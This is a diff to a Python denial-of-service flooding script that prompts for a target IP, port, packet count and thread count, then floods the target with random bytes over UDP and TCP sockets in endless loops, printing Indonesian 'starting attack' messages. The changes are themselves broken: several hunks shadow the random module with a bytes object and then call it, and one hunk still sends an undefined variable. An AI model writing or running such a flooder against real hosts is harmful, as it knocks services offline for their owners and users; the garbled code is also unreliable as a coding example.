@@ -25,60 +25,60 @@ port = int(input("\033[55m=====> Enter The Port Target  : "))
 times = int(input("\033[44m=====> Enter The Packets : "))
 threads = int(input("\033[33]=====>  Enter The Threada : "))
 def Attack():
-	K_K_bytes = random._urandom(577)
-	L_K_bytes = random._urandom(578)
+	random = random._urandom(577)
+	L_bytes = random._urandom(35500)
 	x = random.choice(("[K]","[K]","[K]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
-				s.sendto(K_bytes,addr)
+				s.sendto(random,addr)
 				s.sendto(L_bytes,addr)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
 			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 			
 def Attack():
-	K_K_bytes = random._urandom(1090)
-	L_K_bytes = random._urandom(1020)
+	random = random._urandom(109000)
+	L_bytes = random._urandom(1020)
 	x = random.choice(("[K]","[K]","[K]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
-				s.sendto(K_bytes,addr)
+				s.sendto(random,addr)
 				s.sendto(L_bytes,addr)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
 			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 
 def Attack():
-	K_K_bytes = random._urandom(1025)
-	L_K_bytes = random._urandom(1090)
+	random = random._urandom(1025)
+	L_bytes = random._urandom(1090)
 	x = random.choice(("[K]","[K]","[K]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
-				s.sendto(K_bytes,addr)
+				s.sendto(random,addr)
 				s.sendto(L_bytes,addr)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
 			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 
 def Attack():
-	K_K_bytes = random._urandom(1025)
-	L_K_bytes = random._urandom(102400)
+	random = random._urandom(1025)
+	L_bytes = random._urandom(102400)
 	x = random.choice(("[K]","[K]","[K]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
-				s.sendto(K_bytes,addr)
+				s.sendto(random,addr)
 				s.sendto(L_bytes,addr)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
@@ -94,8 +94,8 @@ def Attack():
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
-				s.send(K_bytes)
-				s.send(I_bytes)
+				s.send(random)
+				s.send(L_bytes)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
 			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
@@ -110,8 +110,8 @@ def Attack():
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
-				s.send(K_bytes)
-				s.send(I_bytes)
+				s.send(random)
+				s.send(L_bytes)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
 			s.close()
@@ -127,8 +127,8 @@ def Attack():
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
-				s.send(K_bytes)
-				s.send(I_bytes)
+				s.send(random)
+				s.send(L_bytes)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
 			s.close()
@@ -144,8 +144,8 @@ def Attack():
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
-				s.send(K_bytes)
-				s.send(I_bytes)
+				s.send(random)
+				s.send(L_bytes)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
 			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
@@ -160,8 +160,8 @@ def Attack():
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
-				s.send(K_bytes)
-				s.send(I_bytes)
+				s.send(random)
+				s.send(L_bytes)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
 			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
@@ -175,7 +175,7 @@ def Attack():
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
-				s.sendto(K_bytes,addr)
+				s.sendto(random,addr)
 				s.sendto(L_bytes,addr)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
@@ -190,7 +190,7 @@ def Attack():
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
-				s.sendto(K_bytes,addr)
+				s.sendto(random,addr)
 				s.sendto(L_bytes,addr)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
@@ -206,8 +206,8 @@ def Attack():
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
-				s.send(K_bytes)
-				s.send(I_bytes)
+				s.send(random)
+				s.send(L_bytes)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
 			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
@@ -223,14 +223,14 @@ def Attack():
 			s.send(data)
 			for x in range(times):
 				s.send(K_bytes)
-				s.send(I_bytes)
+				s.send(L_bytes)
 			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 		except:
 			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
 
-for y in range(threads):
+for udp in range(threads):
 
-	if choice == 'Attack':
+	if choice == 'udp-Tcp':
 
 		th = threading.Thread(target = Attack)
 		th.start()
